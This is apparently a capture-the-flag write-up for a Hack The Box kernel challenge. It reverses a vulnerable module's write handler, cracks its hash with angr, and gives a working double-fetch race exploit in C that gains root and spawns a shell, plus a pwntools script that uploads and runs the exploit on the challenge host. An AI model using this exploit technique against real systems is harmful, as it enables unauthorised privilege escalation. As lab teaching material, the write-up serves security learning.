---
title: "HTB Kernel Adventures: Part 1"
date: 2023-03-08 18:27:30 -0400
categories: Kernel
---

# Kernel Adventures: Part 1

The kernel adventures gives an introduction to double fetch/race condition and prepare & commit creds.

We're going to trick the kernel into thinking we're uid 0 (root) while we're only 1000 (user).

## Analysis

We are interested in two methods: 

```dev_write```:
```c
unsigned __int64 __fastcall dev_write(__int64 a1, const char *a2, unsigned __int64 a3)
{
  int v5; // ebp
  _DWORD *v6; // rax

  if ( a3 <= 7 )
    return 0LL;
  if ( *(_DWORD *)a2 == (_DWORD)users )
  {
    if ( (unsigned int)hash(a2 + 4) == HIDWORD(users) )
      goto LABEL_10;
    if ( dword_548 != *(_DWORD *)a2 )
      return 0LL;
LABEL_9:
    if ( (unsigned int)hash(a2 + 4) != dword_54C )
      return 0LL;
LABEL_10:
    v5 = *(_DWORD *)a2;
    v6 = (_DWORD *)prepare_creds();
    v6[1] = v5;
    v6[2] = v5;
    v6[3] = v5;
    v6[4] = v5;
    v6[5] = v5;
    v6[6] = v5;
    v6[7] = v5;
    v6[8] = v5;
    commit_creds(v6);
    return a3;
  }
  if ( dword_548 == *(_DWORD *)a2 )
    goto LABEL_9;
  return 0LL;
}
```

and ```hash```:
```c
__int64 __fastcall hash(const char *a1)
{
  unsigned int v2; // [rsp+Ch] [rbp-14h]
  unsigned int v3; // [rsp+Ch] [rbp-14h]
  __int64 v4; // [rsp+10h] [rbp-10h]
  size_t v5; // [rsp+18h] [rbp-8h]

  v4 = 0LL;
  v2 = 0;
  v5 = strlen(a1);
  while ( v4 != v5 )
  {
    v3 = 1025 * (a1[v4] + v2);
    v2 = a1[v4++] ^ (v3 >> 6) ^ v3;
  }
  return v2;
}
```

We can observe that dev_write will compare parameter a2 (that we can control) with users (uid 1000) and will trigger prepare & commit when hash matches.

## Planning

There are multiple ways to exploit this kernel module.
And I will explain one way.

We can start by authenticating via supplying 1000 to first four bytes of a2 to pass the second ```if``` statement.

Then supply the right bytes after the first four bytes to crack the hash to flow into LABEL_10 and trigger prepare & commit.

However, the prepare & commit will only push the current uid, which is 1000 (user).
We want root, so we can attempt to trigger a race condition at LABEL_10 (since there are no locks/mutexes) to switch the value of a2 with 0 rather than 1000 before we get into the prepare & commit chain.

## Hash Cracking

We can crack the hash of HIDWORD(users) using **angr**.

Although IDA cannot show which value is stored at HIDWORD(users), dumping the remote binary shows which values that are being compared:
```bash
/ $ dd bs=100 count=1 if=/dev/mysu | hexdump -C
dd bs=100 count=1 if=/dev/mysu | hexdump -C
0+1 records in
0+1 records out
00000000  e8 03 00 00 75 9f 31 03  e9 03 00 00 67 64 b7 2a  |....u.1.....gd.*|
00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000020
```

Here, we can observe that the first four bytes of ```users``` is 0x03e8 and the last four bytes are 0x03319f75.

So we have to crack the hash of 0x03319f75.

We can replicate the hash function using c:
```hash.c```:
```c
#include <stdio.h>
#include <string.h>

char buf[8];

unsigned long hash(char *buf)
{
  unsigned long res = 0; // [rsp+Ch] [rbp-14h]
  unsigned int tmp = 0;  // [rsp+Ch] [rbp-14h]
  int idx;               // [rsp+10h] [rbp-10h]
  size_t len;            // [rsp+18h] [rbp-8h]

  idx = 0;
  res = 0;
  len = strlen(buf);
  while (idx != len)
  {
    tmp = 1025 * (buf[idx] + res);
    res = buf[idx++] ^ (tmp >> 6) ^ tmp;
  }
  return res;
}

int main(void)
{
  memset(buf, 0, 8);
  read(0, buf, 8);

  unsigned long res = hash(buf);
  if (res == 0x03319f75)
  {
    puts("win");
  }
  else
  {
    puts("wrong!");
  }
}
```

and with angr, we can crack the hash:
```crack_hash.py```:
```python
import angr
import sys

project = angr.Project("./hash");
state = project.factory.entry_state()

simmgr = project.factory.simulation_manager(state)

simmgr.explore(find=lambda state: b"win" in state.posix.dumps(1))

if simmgr.found:
    for byte in simmgr.found[0].posix.dumps(0):
        print(hex(byte), end=',')
    print("")

```

angr gives:
```bash
> # python3 crack_hash.py
WARNING  | 2023-04-24 17:41:42,777 | cle.loader     | The main binary is a position-independent execu.
0x6e,0x63,0x7b,0x89,0x0,0x80,0x1,0x0,
```

## Exploit

The exploit finale consists of supplying first four bytes of users uid and another four bytes of cracked hash to mysu.ko.

We could create two threads (since we are going for double fetch), for one to authenticate, and the other to switch the uid.

```exploit.c``` is as follows:
```c
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <limits.h>
#include <unistd.h>
#include <pthread.h>

unsigned char payload[] = {
    0xe8, 0x03, 0x0, 0x0,
    0x6e, 0x63, 0x7b, 0x89, 0x0, 0x80, 0x1, 0x0};

int stop = 0;

void *uid1000_thread() // authenticate uid & hash
{
    while (!stop)
    {
        int fd1 = open("/dev/mysu", O_RDWR);
        payload[0] = 0xe8;
        payload[1] = 0x03;
        write(fd1, payload, sizeof(payload));
        close(fd1);
        if (getuid() == 0)
        {
            stop = 1;
            printf("Gained UID 0\n");
            system("/bin/sh");
        }
    }
}

void *uid0_thread() // swith uid to 0
{
    while (!stop)
    {
        payload[0] = 0x00;
        payload[1] = 0x00;
        if (getuid() == 0)
        {
            stop = 1;
            printf("Gained UID 0\n");
            system("/bin/sh");
        }
    }
}

int main(int argc, char *argv[])
{
    pthread_t t1;
    pthread_t t2;
    pthread_create(&t1, NULL, uid0_thread, NULL);
    pthread_create(&t2, NULL, uid1000_thread, NULL);

    pthread_join(t1, NULL); // pthread_join to keep running even after main exists
    pthread_join(t2, NULL);
}
```

For the final remote exploitation, we are going to send the binary to the remote server using base64 encoding since I believe it's a good practice.

We are going to compile exploit.c using ```musl-gcc``` because it supports execution in cross platforms and it also makes the binary small.
We will also need to compile it statically since the remote environment lacks gcc and linker.

We can compile the binary using:
```bash
x86_64-linux-musl-gcc exploit.c -o exploit -s -static -lpthread
```

and encode it using:
```bash
cat exploit|base64 > output.txt
```

### Remote
In the remote exploitation Python script, I will read from ```output.txt``` and send it to the server and run it there.

The final remote exploit is as follows:
```python
#!/usr/bin/python3
from pwn import *
import os
context.log_level='debug'
context.arch='amd64'
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

# os.system("x86_64-linux-musl-gcc exploit.c -o exploit -s -static -lpthread")
# os.system("cat exploit|base64 > output.txt")

p = remote("143.110.166.8", 31343)

content=""

with open('output.txt') as openfileobject:
    content=openfileobject.read()

sla(b"$ ", 'cd /tmp && echo "'+content+'" | base64 -d > exploit')
sla(b"$ ", b"chmod +x exploit && ./exploit")

p.interactive()
```

### Pwned
```bash
/tmp # $ id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x1 bytes:
    b'i'
i[DEBUG] Received 0x35 bytes:
    b'd\r\n'
    b'uid=0(root) gid=0(root) groups=1000(user)\r\n'
    b'/tmp # '
```

Thank you,

079
